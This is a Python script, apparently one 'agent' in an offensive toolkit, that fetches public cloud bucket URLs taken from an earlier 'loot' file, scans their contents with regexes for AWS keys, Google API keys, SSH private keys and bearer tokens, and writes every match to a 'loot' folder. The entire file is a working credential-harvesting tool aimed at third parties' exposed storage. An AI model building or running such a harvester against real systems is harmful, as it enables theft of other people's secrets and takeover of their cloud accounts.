#!/home/dan/Chimera_Project/venv/bin/python3
import sys
import os
import json
import re
import requests
from datetime import datetime

class IdentityBruter:
    """
    Agent 205: Secret & Key Harvester.
    Scans public cloud storage and leaked files for high-value 
    identity markers like AWS Keys, API Tokens, and Private Keys.
    """
    def __init__(self):
        self.loot_dir = "/home/dan/Chimera_Project/agents/205_Identity_Bruter/loot"
        os.makedirs(self.loot_dir, exist_ok=True)
        
        # Military-grade regex for common cloud/dev secrets
        self.signatures = {
            "AWS_KEY": r"AKIA[0-9A-Z]{16}",
            "AWS_SECRET": r"([A-Za-z0-9/+=]{40})",
            "GOOGLE_API": r"AIza[0-9A-Za-z-_]{35}",
            "SSH_PRIV_KEY": r"-----BEGIN [A-Z ]+ PRIVATE KEY-----",
            "GENERIC_TOKEN": r"bearer [a-zA-Z0-9\-\._\~]{20,}"
        }

    def scan_content(self, content, source_url):
        """Searches a string for secret signatures."""
        findings = []
        for key_type, pattern in self.signatures.items():
            matches = re.findall(pattern, content)
            if matches:
                for match in matches:
                    findings.append({"type": key_type, "key": str(match), "source": source_url})
        return findings

    def execute(self, bucket_loot_path):
        print(f"--- [AGENT 205: CLOUD IDENTITY BRUTING] ---")
        
        if not os.path.exists(bucket_loot_path):
            print("[!] Error: No cloud bucket intelligence found.")
            return

        with open(bucket_loot_path, 'r') as f:
            buckets = json.load(f).get("buckets", [])

        all_secrets = []
        for bucket_url in buckets:
            # We assume the URL points to a public listing or file
            clean_url = bucket_url.split(' - ')[0].replace("[S3] ", "").strip()
            print(f"[*] Scanning Bucket: {clean_url}...")
            try:
                r = requests.get(clean_url, timeout=10)
                if r.status_code == 200:
                    secrets = self.scan_content(r.text, clean_url)
                    if secrets:
                        print(f"    [!!!] DISCOVERED {len(secrets)} SECRETS in {clean_url}")
                        all_secrets.extend(secrets)
            except Exception as e:
                print(f"    [!] Failed to scan {clean_url}: {e}")

        # Commit to Loot
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        loot_file = f"{self.loot_dir}/secrets_{timestamp}.json"
        with open(loot_file, 'w') as f:
            json.dump({
                "timestamp": str(datetime.now()),
                "total_found": len(all_secrets),
                "secrets": all_secrets
            }, f, indent=4)
            
        print(f"[!!!] SECRET INTELLIGENCE COMMITTED: {loot_file}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py <path_to_agent_13_loot>")
        sys.exit(1)
        
    loot_path = sys.argv[1]
    IdentityBruter().execute(loot_path)
